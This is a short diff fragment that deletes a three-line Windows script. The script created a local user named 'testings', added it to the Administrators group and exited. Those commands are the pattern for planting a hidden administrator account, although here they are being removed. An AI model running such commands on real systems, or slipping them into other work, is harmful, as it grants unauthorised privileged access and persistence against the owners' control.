@@ -1,3 +1,0 @@
-net user testings /add
-net localgroup "administrators" testings /add
-exit
